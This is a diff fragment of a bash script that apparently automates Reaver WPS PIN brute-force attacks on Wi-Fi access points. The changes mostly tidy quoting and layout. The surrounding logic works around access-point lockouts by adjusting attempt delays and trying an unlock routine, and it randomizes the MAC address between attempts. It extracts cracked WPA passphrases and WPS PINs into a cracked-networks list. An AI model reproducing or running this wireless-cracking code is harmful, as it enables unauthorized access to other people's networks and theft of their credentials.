-				if [[ "$AP_LOCK" == "Yes" || "$AP_LOCK" == "NULL" ]]; then
-					break;
-				fi
+			if [[ "$AP_LOCK" == "Yes" || "$AP_LOCK" == "NULL" ]]; then break; fi;
+
+			if [[ $REAVER_ATTEMPT_DELAY -lt 60 ]]; then
+				REAVER_ATTEMPT_DELAY=60;
+				date +"%d/%m/%Y %H:%M:%S REAVER_ATTEMPT_DELAY_CHANGED_$REAVER_ATTEMPT_DELAY" >> "$STATUS_FILE";
 			else
-				if [[ $REAVER_ATTEMPT_DELAY -lt 60 ]]; then
-					REAVER_ATTEMPT_DELAY=60;
-					echo $(date +"%d/%m/%Y %H:%M:%S REAVER_ATTEMPT_DELAY_CHANGED_$REAVER_ATTEMPT_DELAY") >> $STATUS_FILE;
-				else
-					if [[ $REAVER_PIN_ATTEMPTS -gt 1 ]]; then
-						REAVER_PIN_ATTEMPTS=1;
-						echo $(date +"%d/%m/%Y %H:%M:%S REAVER_PIN_ATTEMPTS_CHANGED_$REAVER_PIN_ATTEMPTS") >> $STATUS_FILE;
-					fi
-
-					checkAPStatus;
-
-					if [[ "$AP_LOCK" == "Yes" ]]; then
-						unlockAP;
-
-						if [[ "$AP_LOCK" == "Yes"  || "$AP_LOCK" == "NULL" ]]; then
-							break;
-						fi
-					fi
+				if [[ $REAVER_PIN_ATTEMPTS -gt 1 ]]; then
+					REAVER_PIN_ATTEMPTS=1;
+					date +"%d/%m/%Y %H:%M:%S REAVER_PIN_ATTEMPTS_CHANGED_$REAVER_PIN_ATTEMPTS" >> "$STATUS_FILE";
 				fi
+
+				checkAPStatus;
+
+				if [[ "$AP_LOCK" == "Yes" ]]; then unlockAP; fi;
+
+				if [[ "$AP_LOCK" == "Yes"  || "$AP_LOCK" == "NULL" ]]; then break; fi;
 			fi
-		elif [[ $(grep -icw 'wpa_psk_found' $STATUS_FILE) -gt 0 ]]; then
+		elif [[ $(grep -icw 'wpa_psk_found' "$STATUS_FILE") -gt 0 ]]; then
 			while read -r STATUS_LINE; do
 				if [[ $(echo "$STATUS_LINE" | grep -ic "wpa_psk_found") -gt 0 ]]; then
-					WPA_PSK=$(awk '{ print $4 }' <<< $STATUS_LINE);
-					WPA_PSK=$(echo $WPA_PSK | sed s/"'"//g);
+					WPA_PSK=$(awk '{ print $4 }' <<< "$STATUS_LINE");
+					# shellcheck disable=SC2001
+					WPA_PSK=$(echo "$WPA_PSK" | sed s/"'"//g);
 				elif [[ $(echo "$STATUS_LINE" | grep -ic "wps_pin_found") -gt 0 ]]; then
-					WPS_PIN=$(awk '{ print $4 }' <<< $STATUS_LINE);
-					WPS_PIN=$(echo $WPS_PIN | sed s/"'"//g);
+					WPS_PIN=$(awk '{ print $4 }' <<< "$STATUS_LINE");
+					# shellcheck disable=SC2001
+					WPS_PIN=$(echo "$WPS_PIN" | sed s/"'"//g);
 				fi
 			done < "$STATUS_FILE"
 
-			echo "$AP_BSSID $AP_CHANNEL $AP_ESSID $WPS_PIN $WPA_PSK" >> $CRACKED_LIST_FILE;
-			$(rm $SESSION_FILE) && $(rm $STATUS_FILE);
+			echo "$AP_BSSID $AP_CHANNEL $AP_ESSID $WPS_PIN $WPA_PSK" >> "$CRACKED_LIST_FILE";
+			rm "$SESSION_FILE" && rm "$STATUS_FILE";
 			break;
 		fi
 
 		stopMonitor;
 		resetDeviceDriver;
-		getRandomMac;
+		RandomMac;
 		startMonitor;
 	done
 }
@@ -866,20 +868,14 @@ if [[ ! -f $REAVER_DIR"/configurationSettings" ]]; then
         exitAutoReaver;
 fi
 
-if [[ ! -d "$REAVER_TMP_DIR" ]]; then
-        mkdir -p -m 700 $REAVER_TMP_DIR;
-fi
-
-if [[ ! -d "$REAVER_SESSION_DIR" ]]; then
-        mkdir -p -m 700 $REAVER_SESSION_DIR;
-fi
-
-if [[ ! -d "$REAVER_CRACKED_DIR" ]]; then
-        mkdir -p -m 700 $REAVER_CRACKED_DIR;
-fi
+# shellcheck disable=SC2174
+if [[ ! -d "$REAVER_TMP_DIR" ]]; then mkdir -p -m 700 "$REAVER_TMP_DIR"; fi;
+# shellcheck disable=SC2174
+if [[ ! -d "$REAVER_SESSION_DIR" ]]; then mkdir -p -m 700 "$REAVER_SESSION_DIR"; fi;
+# shellcheck disable=SC2174
+if [[ ! -d "$REAVER_CRACKED_DIR" ]]; then mkdir -p -m 700 "$REAVER_CRACKED_DIR"; fi;
 
 checkRequisites;
-
+#Menu;
 autoReaver;
-
 exitAutoReaver;
